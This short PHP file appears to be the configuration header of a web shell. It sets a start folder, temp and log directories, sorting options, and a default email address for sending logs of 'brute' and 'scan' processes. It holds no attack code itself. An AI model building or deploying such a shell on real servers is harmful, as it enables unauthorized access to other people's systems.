<?php
$donated_html = "<center><b>donated_html</b></center>";
/* If you publish free shell and you wish
add link to your site or any other information,
put here your html. */
$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.

$curdir = "./"; //start folder
//$curdir = getenv("DOCUMENT_ROOT");
$tmpdir = ""; //Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)
$tmpdir_log = "./"; //Directory logs of long processes (e.g. brute, scan...)

$log_email = "redhat@w.cn"; //Default e-mail for sending logs

$sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending
$sort_save = TRUE; //If TRUE then save sorting-position using cookies.
?>